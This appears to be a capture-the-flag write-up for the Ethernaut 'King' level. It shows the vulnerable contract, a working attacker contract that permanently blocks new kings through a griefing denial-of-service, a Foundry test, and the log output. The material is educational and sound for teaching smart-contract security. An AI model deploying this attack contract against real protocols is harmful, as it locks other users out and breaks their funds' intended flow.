# What is OpenZeppelin Ethernaut?

OpenZeppelin Ethernaut is an educational platform that provides interactive and gamified challenges to help users learn about Ethereum smart contract security. It is developed by OpenZeppelin, a company known for its security audits, tools, and best practices in the blockchain and Ethereum ecosystem.

OpenZeppelin Ethernaut Website: [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)

<br>

# What You're Supposed to Do?

in `09-King` Challenge, You Should Try To find a Way To Break the Game in a Way that a new `king` Cannot be Set Forever.

`09-King` Challenge Link: [https://ethernaut.openzeppelin.com/level/0x3049C00639E6dfC269ED1451764a046f7aE500c6](https://ethernaut.openzeppelin.com/level/0x3049C00639E6dfC269ED1451764a046f7aE500c6)

<br>

# How Did i Complete this Challenge?

Take a Look at `King` Contract, Especially the `receive()` function:

```javascript
    contract King {
        address king;
        uint256 public prize;
        address public owner;

        constructor() payable {
            owner = msg.sender;
            king = msg.sender;
            prize = msg.value;
        }

        receive() external payable {
            require(msg.value >= prize || msg.sender == owner);
            payable(king).transfer(msg.value);
            king = msg.sender;
            prize = msg.value;
        }

        function _king() public view returns (address) {
            return king;
        }
    }
```

if Attacker Uses a Contract Like This:

```javascript
    contract AttackerCanStayTheKingForever {
        King king;

        constructor(King _king) {
            king = _king;
        }

        function becomeKing() external payable {
            (bool success, ) =  address(king).call{ value: king.prize() }("");
            require(success, "Low Level Call Failed");
        }
    }
```

He Can Become `king` and then after that, Anyone That Tries to Become a `king`, will Fail. Why? This Type of DOS Attack is Known as `Griefing Attack`, where a `call` to a Contract fails forever and it Causes the Protocol to Break.

**How This Happens in this Particular Scenario?**

1. Attacker Becomes new `king` by Paying `value: king.prize()`.
   
2. Another User Comes and Tries To Become the new `king`, This Will Fail! Why? Because of this Line in `receive()` function: `payable(king).transfer(msg.value);`. 
   When We Try To Send ETH to a Contract That Does not Have `receive()` or `fallback()` function, it will Revert. Causing the Attacker to Stay the `king` Forever and Make the intended
   Functionality of the Protocol to Break.


i also Wrote test for this in `King.t.sol`, Which is Named as `testAttackerCanStayKingForever`:

```javascript
    function testAttackerCanStayKingForever() external  {
        AttackerCanStayTheKingForever attackerContract = new AttackerCanStayTheKingForever(king);
        console.log("Attacker Contract Address: ", address(attackerContract));
        console.log("User Address: ", user);
        attackerContract.becomeKing{value: 1 ether}();
        console.log("Current King is: ", king._king());


        console.log("User Tries To Become the new King.");
        vm.startPrank(user);
        (bool success, ) = address(king).call{value: king.prize()}("");
        assertFalse(success, "Low Level Call Failed");
        console.log("it Failed!");
        vm.stopPrank();

        console.log("Current King is: ", king._king());
        assertEq(king._king(), address(attackerContract));
    }
```

run the Following Command in Your Terminal to Run this Test: (Required to Have Foundry Installed.)

```javascript
    forge test --match-test testAttackerCanStayKingForever -vvvv
```

Take a Look at the `Logs`:

```javascript
    Logs:
        Attacker Contract Address:  0x2e234DAe75C793f67A35089C9d99245E1C58470b
        User Address:  0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D
        Current King is:  0x2e234DAe75C793f67A35089C9d99245E1C58470b
        User Tries To Become the new King.
        it Failed!
        Current King is:  0x2e234DAe75C793f67A35089C9d99245E1C58470b
```